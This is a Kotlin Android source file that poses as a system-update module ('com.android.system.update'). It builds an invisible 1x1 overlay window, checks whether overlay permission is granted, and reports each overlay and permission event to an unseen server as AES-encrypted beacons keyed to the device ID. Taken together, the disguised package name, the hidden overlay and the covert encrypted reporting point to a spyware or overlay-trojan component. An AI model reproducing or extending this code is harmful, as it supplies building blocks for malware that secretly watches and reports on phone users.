package com.android.system.update.modules.ui

import android.content.Context
import android.graphics.PixelFormat
import android.os.Build
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.util.Base64
import com.android.system.update.core.NetworkConnectionManager
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class UIOverlayBuilder(private val context: Context) {

    private val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private var overlayView: View? = null
    private val random = SecureRandom()
    private val networkManager = NetworkConnectionManager(context)
    private val deviceKey: ByteArray

    init {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
    }

    fun showTransparentOverlay() {
        val params = WindowManager.LayoutParams(
            1, 1,
            getOverlayType(),
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            alpha = 0.0f
        }

        overlayView = View(context)
        windowManager.addView(overlayView, params)
        val encrypted = encrypt("overlay_shown|${System.currentTimeMillis()}")
        networkManager.sync(encrypted)
    }

    fun removeOverlay() {
        overlayView?.let {
            windowManager.removeView(it)
            overlayView = null
            val encrypted = encrypt("overlay_hidden|${System.currentTimeMillis()}")
            networkManager.sync(encrypted)
        }
    }

    fun checkOverlayPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(context)
        } else {
            true
        }
    }

    fun reportPermissionStatus() {
        val status = checkOverlayPermission()
        val encrypted = encrypt("overlay_permission|$status|${System.currentTimeMillis()}")
        networkManager.sync(encrypted)
    }

    @Suppress("DEPRECATION")
    private fun getOverlayType(): Int {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            WindowManager.LayoutParams.TYPE_PHONE
        }
    }

    private fun encrypt(data: String): String {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        val encrypted = cipher.doFinal(data.toByteArray())
        val combined = iv + encrypted
        return Base64.encodeToString(combined, Base64.NO_WRAP)
    }
}